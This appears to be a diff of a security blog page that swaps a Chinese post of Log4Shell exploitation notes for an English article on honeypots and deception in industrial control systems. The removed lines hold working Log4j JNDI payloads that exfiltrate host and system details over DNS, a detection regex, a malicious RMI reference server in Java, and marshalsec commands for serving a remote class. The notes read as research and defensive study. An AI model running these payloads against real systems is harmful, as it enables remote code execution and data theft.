@@ -15,25 +15,17 @@
 
 
 
+<meta name="description" content="首发于Security Navigator 2023 次发于The Hacker News">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于log4j、log4shell的一些记录">
-<meta property="og:url" content="0sec.com.cn/2021-12-14/index.html">
+<meta property="og:title" content="Honeypot-Factory: The Use of Deception in ICS&#x2F;OT Environments">
+<meta property="og:url" content="0sec.com.cn/2023-02-13/index.html">
 <meta property="og:site_name" content="Cosmic Fragments">
+<meta property="og:description" content="首发于Security Navigator 2023 次发于The Hacker News">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211227003904.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215153345.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215153138.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215195741.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215181823.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215203458.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215014228.jpg">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215181338.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215164239.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211224131635.png">
-<meta property="og:updated_time" content="2021-12-26T16:39:57.724Z">
+<meta property="og:updated_time" content="2023-02-13T11:43:28.557Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="关于log4j、log4shell的一些记录">
-<meta name="twitter:image" content="http://0blog.test.upcdn.net/20211227003904.png">
+<meta name="twitter:title" content="Honeypot-Factory: The Use of Deception in ICS&#x2F;OT Environments">
+<meta name="twitter:description" content="首发于Security Navigator 2023 次发于The Hacker News">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -65,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>关于log4j、log4shell的一些记录 | Cosmic Fragments</title>
+<title>Honeypot-Factory: The Use of Deception in ICS/OT Environments | Cosmic Fragments</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -224,11 +216,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-关于log4j、log4shell的一些记录" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Honeypot-Factory-The-Use-of-Deception-in-ICS-OT-Environments" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021-12-14/" class="article-date">
-      <time datetime="2021-12-14T14:20:48.000Z" itemprop="datePublished">2021-12-14</time>
+      <a href="/2023-02-13/" class="article-date">
+      <time datetime="2023-02-13T11:36:33.000Z" itemprop="datePublished">2023-02-13</time>
 </a>
 
 
@@ -243,7 +235,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      关于log4j、log4shell的一些记录
+      Honeypot-Factory: The Use of Deception in ICS/OT Environments
     </h1>
   
 
@@ -260,78 +252,29 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><img src="http://0blog.test.upcdn.net/20211227003904.png" alt=""><br><a id="more"></a></p>
-<h2 id="无法外带敏感数据问题"><a href="#无法外带敏感数据问题" class="headerlink" title="无法外带敏感数据问题"></a>无法外带敏感数据问题</h2><p>通过DNSLOG外带敏感信息时，使用子域名形式会有一部分信息带不出来。比如我在下面分别拼接了四个payload：</p>
-<pre><code>${hostName}
-${sys:user.dir}
-${sys:java.version}
-${java:os}}
-</code></pre><p>位置如图：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215153345.png" alt=""></p>
-<p>结果是只有<code>hostname</code>和<code>java.version</code>外带出了信息：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215153138.png" alt=""></p>
-<p>带不出来的原因是返回的结果中会有一些特殊字符如空格，导致jndi lookup抛出NamingException:</p>
-<p><img src="http://0blog.test.upcdn.net/20211215195741.png" alt=""></p>
-<p>所以更好的方法是通过dns外带，监听UDP端口，并将变量名拼接在url之后：</p>
-<pre><code>${jndi:dns://127.0.0.1:6666/${hostName} -${sys:user.dir}- ${sys:java.version} - ${java:os}}
-</code></pre><p>如图可以外带敏感信息：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215181823.png" alt=""></p>
-<p>那么这些<code>{}</code>究竟是什么变量，以及其他还可以外带哪些敏感信息呢，这个我也找了一下。<a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" target="_blank" rel="noopener">log4j 漏洞一些特殊的利用方式</a>这篇文章提到了<code>System.getProperty()</code>和<code>System.getenv()</code>以及Bundle，但我本地打印了一下发现并不是<code>${sys:java.version}</code>这样的key-value对，应该是log4j从这些属性中读出信息后自己进行了处理，这个有待debug跟一下。</p>
-<p>另外浅蓝师傅还在文章中提到了<code>ResourceBundle</code>加载.properties 配置文件，导致可以读配置项信息的问题：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215203458.png" alt=""></p>
-<h2 id="好用的正则表达式"><a href="#好用的正则表达式" class="headerlink" title="好用的正则表达式"></a>好用的正则表达式</h2><p>Twitter上@egglessness老哥分享的正则：</p>
-<pre><code>\${(\${(.*?:|.*?:.*?:-)(&#39;|&quot;|`)*(?1)}*|[jndi:lapsrm](&#39;|&quot;|`)*}*){9,11}
-</code></pre><p>我用regexr测试了一下，前缀是都能匹配上的，即使进行了大小写或者随机符号混淆：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215014228.jpg" alt=""></p>
-<p>可以从这里调试一下：</p>
-<p><a href="https://regex101.com/r/bImUQl/1" target="_blank" rel="noopener">https://regex101.com/r/bImUQl/1</a></p>
-<p>我匹配的payload是使用<a href="https://github.com/woodpecker-framework/woodpecker-framwork-release" target="_blank" rel="noopener">woodpecker框架</a>加载<a href="https://github.com/woodpecker-appstore/log4j-payload-generator" target="_blank" rel="noopener">此payload插件</a>生成的：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215181338.png" alt=""></p>
-<p>可以帮助进行大小写混淆和随机符号混淆。</p>
-<h2 id="ElasticSearch中的log4j版本受影响但无法RCE"><a href="#ElasticSearch中的log4j版本受影响但无法RCE" class="headerlink" title="ElasticSearch中的log4j版本受影响但无法RCE"></a>ElasticSearch中的log4j版本受影响但无法RCE</h2><blockquote>
-<p>偷师P牛</p>
-</blockquote>
-<p>创建的index名中带payload时会写进日志，经由log4j处理，但是ES对index的名字有一些限制，无法使用特殊字符：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215164239.png" alt=""></p>
-<p>template index可以使用payload触发jndi lookup，但是由于ES使用了Security Manager安全机制来防御文件操作和Socket操作，所以无法正常连接远程服务器，也就无法实现RCE。只能用DNS外带一些敏感信息了。</p>
-<h2 id="利用RMI攻击要求jdk版本更低"><a href="#利用RMI攻击要求jdk版本更低" class="headerlink" title="利用RMI攻击要求jdk版本更低"></a>利用RMI攻击要求jdk版本更低</h2><p>LDAP协议攻击Log4j要求jdk版本低于8u191，RMI协议攻击要求jdk版本低于8u121。都是针对被攻击端的jdk版本要求。</p>
-<p>我的jdk版本为8u181，默认情况下，还可以指定URI为LDAP协议来进行JNDI注入攻击，但RMI和CORBA已被禁止使用远程codebase。主动开启选项<code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</code>才可以利用成功：</p>
-<p><img src="http://0blog.test.upcdn.net/20211224131635.png" alt=""></p>
+        <p>首发于<a href="https://www.orangecyberdefense.com/global/security-navigator" target="_blank" rel="noopener">Security Navigator 2023</a></p>
+<p>次发于<a href="https://thehackernews.com/2023/02/honeypot-factory-use-of-deception-in.html" target="_blank" rel="noopener">The Hacker News</a><br><a id="more"></a></p>
+<p>There have been a number of reports of attacks on industrial control systems (ICS) in the past few years. Looking a bit closer, most of the attacks seem to have spilt over from traditional IT. That’s to be expected, as production systems are commonly connected to ordinary corporate networks at this point.</p>
+<p>Though our data does not indicate at this point that a lot of threat actors specifically target industrial systems – in fact, most evidence points to purely opportunistic behaviour – the tide could turn any time, once the added complexity of compromising OT environments promises to pay off. Criminals will take any chance they get to blackmail victims into extortion schemes, and halting production can cause immense damage. It is likely only a matter of time. So cybersecurity for operational technology (OT) is vitally important.</p>
+<p>Deception is an effective option to improve threat detection and response capabilities. However, ICS security differs from traditional IT security in several ways. While deception technology for defensive use like honeypots has progressed, there are still challenges due to fundamental differences like the protocols used. This article is intended to detail the progress and challenges when deception technology transits from traditional IT to ICS security.</p>
+<p>The value of deception: taking back the initiative#<br>Deception technology is an active security defense method that detects malicious activities effectively. On the one hand, this strategy constructs an environment of false information and simulations to mislead an adversary’s judgment, making unsuspecting attackers fall into a trap to waste their time and energy, increasing the complexity and uncertainty of the intrusion.</p>
+<p>At the same time, the defenders can collect more comprehensive attack logs, deploy countermeasures, trace the source of attackers and monitor their attack behaviors. Recording everything to research the tactics, techniques, and procedures (TTP) an attacker uses is of great help for the security analysts. Deception techniques can give defenders back the initiative.</p>
+<p>With some deception applications, for instance honeypots, the operating environment and configuration can be simulated, thus luring the attacker to penetrate the fake target. By this means, defenders will be able to grab the payloads the attackers drop and get information about the attacker’s hosts or even web browser by JavaScript in web applications. What’s more, it is possible to know the attacker’s social media accounts by JSONP Hijacking as well as countering the attacker through ‘honey files.’ It can be predicted that deception technology will be more mature and widely used in the coming years.</p>
+<p>Recently, the integration of information technology and industrial production has been accelerating with the rapid development of the Industrial Internet and intelligent manufacturing. The connection of massive industrial networks and equipment to IT technology will inevitably lead to increasing security risks in this field.</p>
+<h2 id="Production-at-risk"><a href="#Production-at-risk" class="headerlink" title="Production at risk"></a>Production at risk</h2><p>Frequent security incidents such as ransomware, data breaches, and advanced persistent threats seriously affect industrial enterprises’ production and business operations and threaten the digital society’s security. Generally, these systems are prone to be weak and exploited easily by the attacker due to their simple architecture, which uses low processing power and memory. It is challenging to protect ICS from malicious activities as the components of ICS are unlikely to take any updates or patches due to their simple architecture. Installing endpoint protection agents is usually not possible either. Considering these challenges, deception can be an essential part of the security approach.</p>
 <blockquote>
-<p>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
-<p>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p>
-<p>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p>
+<p>Conpot is a low-interactive honeypot that can simulate the IEC104, Modbus, BACnet, HTTP, and other protocols, which can be easily deployed and configured.<br>XPOT is a software-based high-interactive PLC honeypot which can run programs. It simulates Siemens S7-300 series PLCs and allows the attacker to compile, interpret and load PLC programs onto XPOT. XPOT supports S7comm and SNMP protocols and is the first high-interactive PLC honeypot. Since it is software-based, it is very scalable and enables large decoy or sensor networks. XPOT can be connected to a simulated industrial process in order to make adversaries’ experiences comprehensive.</p>
+<p>CryPLH is a low-interactive and virtual Smart-Grid ICS honeypot simulating Siemens Simatic 300 PLC devices. It uses Nginx and miniweb web servers to simulate HTTP(S), a Python script to simulate Step 7 ISO-TSAP protocol and a custom SNMP implementation. The authors deployed the honeypot within the university’s IP range and observed scanning, pinging, and SSH login attempts. It can be seen that the ability of interaction is gradually increasing from the simulation of ICS protocol to ICS environment.</p>
+<p>With the development of cybersecurity technology, deception has been applied in various circumstances like the web, databases, mobile apps, and IoT. Deception technology has been embodied in some ICS honeypot applications in the OT field. For instance, ICS honeypots like Conpot, XPOT, and CryPLH can simulate the Modbus, S7, IEC-104, DNP3 and other protocols.</p>
 </blockquote>
-<p>测试RMI Server:</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span>
+<p>Accordingly, deception technology like the honeypot applications above can make up for the low efficiency of detection systems for unknown threats and can play an important role in ensuring the safety of industrial control networks. These applications can help detect cyber attacks on industrial control systems and display a general risk trend. The actual OT vulnerabilities exploited by the attackers can be caught and sent to the security analyst, thus leading to timely patches and intelligence. In addition to this, it is possible to get a prompt alert e.g. before ransomware breaks out and avoid massive losses and a stop in production.</p>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>This is not a ‘silver bullet’, however. In comparison to the sophisticated deception available in traditional IT security, deception in ICS still faces some challenges.</p>
+<p>First and foremost, there are numerous kinds of industrial control devices as well as protocols, and many protocols are proprietary. It is almost impossible to have a deception technology that can be applied to all industrial control devices. Therefore, honeypots and other applications often need to be customized for the emulation of different protocols, which brings a relatively high threshold for implementation in some environments.</p>
+<p>The second problem is that pure virtual industrial control honeypots still have limited simulation capabilities, making them susceptible to hacker identification. The current development and application of purely virtual ICS honeypots only allow the underlying simulation of industrial control protocols, and most of them have been open source, straightforward to be found by search engines such as Shodan or Zoomeye. Collecting adequate attack data and improving ICS honeypots’ simulation capabilities is still challenging for security researchers.</p>
+<p>Last but not least, high-interaction industrial control honeypots consume considerable resources and have high maintenance costs. Apparently, honeypots often require the introduction of physical systems or equipment in order to build a real-run simulation environment. However, industrial control systems and equipment are costly, hard to reuse, and challenging to maintain. Even seemingly similar ICS devices are often remarkably diverse in terms of functionality, protocols and instructions.</p>
+<h2 id="Is-it-worth-it"><a href="#Is-it-worth-it" class="headerlink" title="Is it worth it?"></a>Is it worth it?</h2><p>Based on the above discussion, deception technology for ICS should be considered for integration with new technology. The ability to simulate and interact with a simulated environment strengthens defense technology. Moreover, the attack log captured by the deception application is of great value. Analyzed through AI or Big data tools, it helps to get an in-depth understanding of ICS field intelligence.</p>
+<p>To summarize, deception technology plays a vital role in the rapid development of ICS network security and improves intelligence as well as the ability of defend. However, the technology is still facing challenges and needs a breakthrough.</p>
 
-<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span>
-<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
-<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>
-
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
-        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Create RMI registry on port 1099!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment" spellcheck="true">// Reference 需要传入三个参数 (className, factory, factoryLocation)</span>
-        <span class="token comment" spellcheck="true">// 第一个参数随便填，第二各参数要填 HTTP 服务下的类名，第三个参数填写远程地址</span>
-        Reference refObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"whatever"</span><span class="token punctuation">,</span> <span class="token string">"EvilObject"</span><span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1:8080/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment" spellcheck="true">// ReferenceWrapper 包裹 Reference 类，使其能通过 RMI 进行远程访问</span>
-        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>refObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"refObj"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-
-</code></pre>
-<p>marshalsec启动服务监听:</p>
-<pre><code>git clone https://github.com/mbechler/marshalsec.git
-cd marshalsec
-mvn clean package -DskipTests
-
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.198.138:1111/#Calc&quot; 9999
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.198.138:1111/#Calc&quot; 9999
-</code></pre>
       
     </div>
     
@@ -342,16 +285,10 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;h
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2022-02-13/">
-                    Websocket渗透测试指北
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021-11-27/">
-                    红队视角下的信息收集（备忘 &amp;&amp; 持续收集）
+                <a href="/2022-08-21/">
+                    Pass the Hash再思考：场景、补丁与监测
                 </a>
             </div>
         
@@ -363,7 +300,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;h
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#无法外带敏感数据问题"><span class="toc-number">1.</span> <span class="toc-text">无法外带敏感数据问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#好用的正则表达式"><span class="toc-number">2.</span> <span class="toc-text">好用的正则表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ElasticSearch中的log4j版本受影响但无法RCE"><span class="toc-number">3.</span> <span class="toc-text">ElasticSearch中的log4j版本受影响但无法RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用RMI攻击要求jdk版本更低"><span class="toc-number">4.</span> <span class="toc-text">利用RMI攻击要求jdk版本更低</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Production-at-risk"><span class="toc-number">1.</span> <span class="toc-text">Production at risk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number">2.</span> <span class="toc-text">Challenges</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Is-it-worth-it"><span class="toc-number">3.</span> <span class="toc-text">Is it worth it?</span></a></li></ol>
         
     </div>
     <style>
@@ -399,7 +336,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;h
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"关于log4j、log4shell的一些记录　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Honeypot-Factory: The Use of Deception in ICS/OT Environments　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -419,15 +356,13 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;h
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2022-02-13/" title="上一篇: Websocket渗透测试指北">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021-11-27/" title="下一篇: 红队视角下的信息收集（备忘 &amp;&amp; 持续收集）">
+            <a href="/2022-08-21/" title="下一篇: Pass the Hash再思考：场景、补丁与监测">
                 <i class="fa fa-angle-right"></i>
             </a>
         
